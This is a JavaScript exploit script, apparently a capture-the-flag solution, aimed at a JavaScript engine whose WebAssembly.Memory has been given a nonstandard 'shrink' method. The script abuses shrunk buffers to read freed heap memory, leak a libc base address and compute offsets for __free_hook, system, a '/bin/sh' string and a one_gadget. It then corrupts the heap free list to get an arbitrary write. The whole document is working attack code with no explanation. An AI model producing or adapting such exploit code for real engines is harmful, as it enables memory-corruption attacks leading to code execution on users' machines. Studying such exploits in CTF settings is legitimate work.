function AllocateMemory(){
	return new WebAssembly.Memory({
	initial:1,
	maximum:15
	});	
}



var mem1 = AllocateMemory();
var mem2 = AllocateMemory();
var mem3 = AllocateMemory();
var mem4 = AllocateMemory();
var mem5 = AllocateMemory();
var mem6 = AllocateMemory();
var mem7 = AllocateMemory();
var mem8 = AllocateMemory();


mem1.shrink(4);

var newArr = new Uint32Array(mem5.buffer)

var buf1 = new Uint32Array(mem1.buffer); 
buf1[0] = 0x63636363
buf1[1] = 0x64646464

var leak = buf1[3]*0x100000000+buf1[2]
var libc_base = leak - 0x1ed390
var free_hook = 0x1eee48+libc_base+0x10
var system = 0x52290+libc_base+0x10
var binsh = 0x1b45bd+libc_base
var one_gadget = 0xe3afe+libc_base

console.log(libc_base)

mem1.shrink(mem1.buffer.byteLength-0x68);
mem2.shrink(mem2.buffer.byteLength-0x68);

var buf2 = new Uint32Array(mem1.buffer)
var buf3 = new Uint32Array(mem2.buffer)
var x1 = new Uint32Array(mem3.buffer)
var x2 = new Uint32Array(mem4.buffer)
var x3 = new Uint32Array(mem5.buffer)
var x4 = new Uint32Array(mem6.buffer)
var x5 = new Uint32Array(mem7.buffer)
var x6 = new Uint32Array(mem8.buffer)


buf2[0] = 0x61616161;
buf2[1] = 0x62626262;

mem1.shrink(0x68)
mem2.shrink(0x68)

buf3[1] = free_hook/0x100000000
buf3[0] = free_hook&0xffffffff

mem4.shrink(mem3.buffer.byteLength-0x68)
mem5.shrink(mem5.buffer.byteLength-0x68)

var target = new Uint32Array(mem5.buffer)
target[0] = 0xdeadbeef // Arbitrary write


Math.atan2()